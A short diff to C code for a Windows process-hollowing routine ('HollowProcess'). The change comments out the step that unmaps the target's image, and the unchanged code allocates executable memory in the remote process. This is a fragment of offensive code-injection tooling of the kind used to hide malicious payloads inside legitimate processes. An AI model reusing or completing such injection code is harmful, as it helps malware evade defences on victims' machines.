@@ -126,11 +126,13 @@ BOOL HollowProcess(HANDLE hProcess, PBYTE pPayload, SIZE_T sSize) {
     LOG_INFO("Attempting to unmap ImageBase: 0x%p from process: 0x%p", (PVOID)pNTHeaders->OptionalHeader.ImageBase, hProcess);
 
     // Unmap the existing executable from the target process
+    /*
     if (pNtUnmapViewOfSection(hProcess, (PVOID)pNTHeaders->OptionalHeader.ImageBase) != STATUS_SUCCESS) {
         LOG_ERROR("It's jover");
         LOG_ERROR("Failed to unmap the section from the target process, error: %ld", GetLastError());
         return FALSE;
     }
+    */
     LOG_SUCCESS("ALL GOOD");
     // Allocate memory in the target process for the new executable
     LPVOID pRemoteImage = VirtualAllocEx(hProcess, (LPVOID)pNTHeaders->OptionalHeader.ImageBase, pNTHeaders->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
